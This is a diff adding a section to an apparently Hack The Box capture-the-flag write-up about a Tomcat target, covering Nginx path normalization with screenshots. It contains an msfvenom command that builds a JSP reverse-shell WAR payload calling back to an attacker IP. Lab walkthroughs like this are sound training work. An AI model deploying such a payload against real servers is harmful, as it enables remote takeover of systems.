@@ -201,3 +201,16 @@ Nmap done: 1 IP address (1 host up) scanned in 41.80 seconds
 
   - Tomcat Credentials.
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/621c388b-8930-4405-a3f9-16617938e594)
+
+## Nginx Path Normalization
+
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/2e3a3cc4-9461-4747-9b1d-7fe2669ab38e)
+
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/82189bdc-339e-46c6-9bcf-0f2fdc4fec29)
+
+```CSS
+▶ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=31337 -f war > shell.war
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/eb471ef1-f23b-4b56-a8fc-424a06a194f9)
+
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/7d47d7d9-fe6e-4123-8817-0a2b81465e48)
